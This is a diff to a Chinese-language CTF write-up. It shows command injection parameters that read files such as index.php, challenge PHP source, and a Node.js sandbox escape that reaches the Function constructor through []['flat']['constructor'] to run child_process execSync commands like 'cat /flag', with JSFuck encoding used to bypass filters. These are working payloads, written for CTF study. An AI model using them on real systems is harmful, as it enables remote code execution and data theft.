@@ -34,6 +34,43 @@ cmd=find / -name "flag"
 也找不到，说明flag不在系统文件，很可能在数据库中，复现大佬的解题过程：
 
 key=114514&cmd=base64 ../index.php 第一次知道这样的...
+```php
+<?php
+include 'connect.php';
+
+$my_money = 3.00;
+$msg = "";
+$target_id = 0;
+
+if (isset($_POST['buy']) && isset($_POST['item_id'])) {
+    $target_id = (int)$_POST['item_id'];
+
+    if ($target_id > 0) {
+        try {
+            $stmt = $pdo->prepare("CALL buy_item(?, ?)");
+            $stmt->execute([$target_id, $my_money]);
+            $res = $stmt->fetch();
+            $msg = $res['final_message'];
+            $my_money -= $res['current_price'];
+        } catch (Exception $e) {
+            $msg = "Transaction Error: " . $e->getMessage();
+        }
+    } else {
+        $msg = "Invalid item selected.";
+    }
+} else {
+    try {
+        $stmt = $pdo->query("SELECT id, name, price FROM goods ORDER BY id ASC");
+        if ($stmt === false) {
+            exit;
+        }
+        $goods_list = $stmt->fetchAll();
+    } catch (Exception $e) {
+        die("Error fetching goods list.");
+    }
+}
+?>
+```
 
 这里的核心在如下两行代码中：
 
@@ -243,3 +280,23 @@ const a = require("./a.js")
 console.log(a)
 ```
 输出文件中写的内容
+
+然后这里其实可以看到wp最前面用的不是filter，有用到flat啥的，本质都是为了利用function构造器，以下这些都可以：
+```javascript
+[]["map"]["constructor"]
+[]["sort"]["constructor"]
+[]["flat"]["constructor"]
+setTimeout["constructor"]
+规则:任何函数.constructor = Function
+```
+这里选flat：
+```javascript
+[]["flat"]["constructor"]("return process.mainModule.require('child_process').execSync('ls /').toString()")()
+[]["flat"]["constructor"]("return process.mainModule.require('child_process').execSync('cat /flag').toString()")()
+```
+然后jsfuck编码一下：
+
+<img width="2307" height="450" alt="image" src="https://github.com/user-attachments/assets/518fc8b3-f20a-4de2-a69d-cbb0fa505ec1" />
+
+
+
